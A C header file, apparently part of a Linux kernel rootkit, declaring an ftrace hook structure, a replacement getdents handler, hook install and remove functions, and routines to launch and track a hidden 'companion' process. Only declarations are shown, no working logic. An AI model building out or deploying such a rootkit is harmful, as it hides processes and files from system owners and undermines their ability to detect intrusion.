#ifndef HIDE_H
# define HIDE_H

# include <linux/init.h>
# include <linux/module.h>
# include <linux/syscalls.h>
# include <linux/kernel.h>
# include <linux/kallsyms.h>
# include <asm/unistd.h>
# include <linux/smp.h>
# include <linux/preempt.h>
# include <linux/vmalloc.h>
# include <linux/ftrace.h>
# include <linux/dirent.h>
# include <linux/fs.h>
# include <linux/string.h>
# include <linux/ctype.h>
# include <linux/file.h>
# include <linux/stat.h>
# include <linux/sched/signal.h>

// https://www.intel.com/content/www/us/en/docs/dpcpp-cpp-compiler/developer-guide-reference/2024-1/foptimize-sibling-calls.html
# pragma GCC optimize("-fno-optimize-sibling-calls")

typedef struct ftrace_hook {
    const char *name;
    void *function;
    void *original;

    unsigned long address;
    struct ftrace_ops ops;
} t_ftrace_hook;

extern int g_pid_companion;

asmlinkage long myGetDents(const struct pt_regs *regs);

int fh_install_hook(t_ftrace_hook *hook);
void fh_remove_hook(t_ftrace_hook *hook);
extern asmlinkage long (*g_original_getdents)(const struct pt_regs *);

void launch_companion(void);
void get_pid_companion(void);

#endif
